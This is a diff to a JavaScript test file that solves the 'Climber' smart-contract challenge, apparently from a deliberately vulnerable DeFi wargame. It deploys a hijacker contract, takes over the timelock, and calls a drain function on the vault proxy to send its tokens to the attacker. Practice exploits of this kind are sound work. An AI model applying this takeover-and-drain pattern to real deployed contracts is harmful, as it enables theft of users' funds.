@@ -53,6 +53,24 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        /*console.log("this.timelock.address", this.timelock.address);
+        console.log("this.vault.address", this.vault.address);
+        console.log("attacker.address", attacker.address);*/
+
+
+        this.hijacker = await (await ethers.getContractFactory('ClimberVaultHijacker', attacker)).deploy();
+        /*console.log("hijacker.address", this.hijacker.address);
+
+        console.log("ROLE_ADMIN", await this.timelock.ADMIN_ROLE());
+        console.log("ROLE_PROPOSER", await this.timelock.PROPOSER_ROLE());*/
+        await this.hijacker.hijack(this.timelock.address, this.vault.address);
+
+        this.vaultProxy = await (
+            await ethers.getContractFactory('ClimberVaultHijacker', attacker)
+        ).attach(this.vault.address);
+
+        await this.vaultProxy.drain(this.token.address, attacker.address);
+
     });
 
     after(async function () {
